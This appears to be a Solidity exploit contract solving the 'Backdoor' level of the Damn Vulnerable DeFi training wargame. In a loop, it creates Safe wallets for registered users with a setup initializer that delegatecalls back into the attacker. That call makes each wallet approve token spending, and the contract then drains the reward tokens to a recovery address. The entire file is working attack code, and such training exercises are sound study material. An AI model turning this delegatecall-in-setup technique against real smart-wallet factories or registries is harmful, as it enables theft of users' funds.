// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {SafeProxy} from "safe-smart-account/contracts/proxies/SafeProxy.sol";
import "../../src/backdoor/WalletRegistry.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";

contract Attacker {
    DamnValuableToken token;
    SafeProxyFactory factory;
    WalletRegistry registry;
    address singleton;
    address recovery;

    constructor(DamnValuableToken _token, 
                SafeProxyFactory _factory, 
                WalletRegistry _registry, 
                address _singleton, 
                address _recovery) {
        token = _token;
        factory = _factory;
        registry = _registry;
        singleton = _singleton;
        recovery = _recovery;
    }

    function handle_delegatecall(DamnValuableToken _token, address attacker) public {
        _token.approve(attacker, 10e18);
    }

    function attack(address[] calldata users) public {
        for (uint i = 0; i < 4; i++){
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory attacking_data = abi.encodeCall(
                this.handle_delegatecall, (token, address(this)));

            bytes memory initializer = abi.encodeCall(
                Safe.setup,
                (
                    owners,
                    1,
                    address(this),
                    attacking_data,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );

            SafeProxy wallet = factory.createProxyWithCallback(singleton, initializer, 1, IProxyCreationCallback(registry));

            token.transferFrom(address(wallet), recovery, 10e18);
        }
    }
}